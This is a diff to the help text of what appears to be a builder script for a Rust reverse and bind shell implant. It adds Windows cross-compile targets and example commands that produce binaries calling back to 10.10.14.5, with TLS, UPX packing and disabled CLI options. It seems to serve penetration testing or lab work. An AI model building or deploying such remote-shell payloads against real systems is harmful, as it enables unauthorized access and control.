@@ -70,15 +70,27 @@ ${TEAL}Options:${RESET}
     ${YELLOW}--pubkey <key>${RESET}      Authorized public key (base64)
     ${YELLOW}--nocli${RESET}             Disable CLI argument parsing in binary
     ${YELLOW}--bind-port <port>${RESET}  Additional bind port after reverse connect
-    ${YELLOW}--target <triple>${RESET}   Cross-compile for specified target (e.g., x86_64-unknown-linux-musl)
+    ${YELLOW}--target <triple>${RESET}   Cross-compile for specified target:
+                             x86_64-unknown-linux-musl   (static Linux x64)
+                             i686-unknown-linux-musl     (static Linux x86)
+                             x86_64-pc-windows-gnu       (Windows x64)
+                             i686-pc-windows-gnu         (Windows x86)
     ${YELLOW}--compress${RESET}          Compress with UPX after building
     ${YELLOW}--dry-run${RESET}           Show configuration without building
     ${YELLOW}--help${RESET}              Show this help message
 
 ${TEAL}Examples:${RESET}
+    ${SUBTEXT}# Linux target (native build):${RESET}
     ${SUBTEXT}$0 reverse 192.168.1.10:4444${RESET}
     ${SUBTEXT}$0 listen 8888 --password "s3cret" --tls${RESET}
     ${SUBTEXT}$0 reverse 10.10.14.5:443 --tls --compress${RESET}
+
+    ${SUBTEXT}# Windows target (cross-compile — requires the Rust target installed):${RESET}
+    ${SUBTEXT}#   rustup target add x86_64-pc-windows-gnu${RESET}
+    ${SUBTEXT}#   apt install mingw-w64${RESET}
+    ${SUBTEXT}$0 reverse 10.10.14.5:4444 --target x86_64-pc-windows-gnu${RESET}
+    ${SUBTEXT}$0 listen 4444 --target x86_64-pc-windows-gnu --tls${RESET}
+    ${SUBTEXT}$0 reverse 10.10.14.5:443 --target i686-pc-windows-gnu --nocli --compress${RESET}
 USAGE
     exit 0
 }
